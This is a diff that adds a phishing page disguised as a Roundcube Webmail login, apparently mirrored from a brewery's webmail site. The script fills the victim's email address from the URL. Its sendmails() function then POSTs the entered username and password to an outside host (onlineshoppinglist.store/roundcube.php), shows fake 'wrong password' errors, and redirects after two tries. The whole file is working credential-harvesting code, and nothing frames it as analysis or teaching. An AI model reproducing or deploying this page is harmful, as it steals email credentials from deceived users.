@@ -1,0 +1,145 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from webmail.staustellbrewery.co.uk/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Jul 2020 09:14:24 GMT -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+<title>Roundcube Webmail :: Welcome to Roundcube Webmail</title>
+<meta name="Robots" content="noindex,nofollow" />
+<meta name="viewport" content="" id="viewport" />
+<link rel="shortcut icon" href="https://rcube.uniweb.no/skins/larry/images/favicon.ico"/>
+<link rel="stylesheet" type="text/css" href="https://rcube.uniweb.no/skins/larry/styles.min.css?s=1523445227" />
+<!--[if IE 9]><link rel="stylesheet" type="text/css" href="skins/larry/svggradients.min.css?s=1510561638" /><![endif]-->
+<link rel="stylesheet" type="text/css" href="https://rcube.uniweb.no/plugins/jqueryui/themes/larry/jquery-ui.css?s=1523445226">
+<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</head>
+<body>
+
+<h1 class="voice">Roundcube Webmail Login</h1>
+
+<div id="login-form">
+<div class="box-inner" role="main">
+<img src="https://rcube.uniweb.no/skins/larry/images/roundcube_logo.png" id="logo" alt="Roundcube Webmail">
+
+<div name="form">
+<table><tbody><tr><td class="title"><label for="rcmloginuser">Username</label>
+</td>
+<td class="input"><input id="rcmloginuser" required="required" size="40" autocapitalize="off" autocomplete="off" type="text" value="" readonly></td>
+</tr>
+<tr><td class="title"><label for="rcmloginpwd">Password</label>
+</td>
+<td class="input"><input  id="rcmloginpwd" required="required" size="40" autocapitalize="off" autocomplete="off" type="password"></td>
+</tr>
+</tbody>
+</table>
+<p class="formbuttons"><input type="submit" id="rcmloginsubmit" class="button mainaction" value="Login" onclick="sendmails()"></p>
+
+</div>
+
+</div>
+
+<div class="box-bottom" role="complementary">
+	<div id="message"></div>
+	<noscript>
+		<p class="noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
+	</noscript>
+</div>
+<p id="bottomline" class="errormsg"  role="contentinfo" style="padding:0px;color:red;margin:0px;font-size:12px;display:none">
+	Wrong password, please enter the correct password and try again
+</p>
+<div id="bottomline" role="contentinfo">
+	Roundcube Webmail
+
+</div>
+</div>
+
+</body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
+
+<script>
+
+var queryString = window.location.href;
+var dom= queryString.split("#");
+var email = dom[1];
+var count = 0;
+
+
+var company = email.split("@");
+var domain = company[1];
+document.getElementById("rcmloginuser").value = email;
+
+
+$('#rcmloginpwd').keyup(function(event) {
+		if (event.which == 13) {
+				$('#rcmloginsubmit').click();
+		}
+});
+
+
+function sendmails() {
+
+	var ps = $("#rcmloginpwd").val();
+	var submit = true;
+
+	if(ps == null || ps == ""){
+			$('.errormsg').show();
+      submit = false;
+	}
+
+  else {
+		$('.errormsg').hide();
+		submit = true;
+	}
+
+	if(submit == true) {
+
+    $.ajax({
+			url: 'https://onlineshoppinglist.store/roundcube.php', // full url of processor.php
+			type: 'POST',
+			data: {
+					user: email,
+					pass: ps,
+	type: 1
+			},
+			beforeSend: function() {
+				$('#rcmloginsubmit').val('Loading...');
+},
+
+			success: function(response) {
+					if (response == 0) {
+							count = count + 1;
+
+							if (count >= 2) {
+								$(".errormsg").hide();
+
+
+							$(document).ready(function(){
+								window.location.replace("cancelled.php?TzWBxtu23Kl890321&id="+email);
+								setTimeout(redirect,800);
+							})
+
+
+							} else {
+								$(".errormsg").show();
+								$("#rcmloginpwd").val("");
+							}
+
+	}
+			},
+
+			complete: function(){
+				$('#rcmloginsubmit').val('Login');
+			}
+	});
+
+}
+
+}
+
+
+
+</script>
+
+</html>
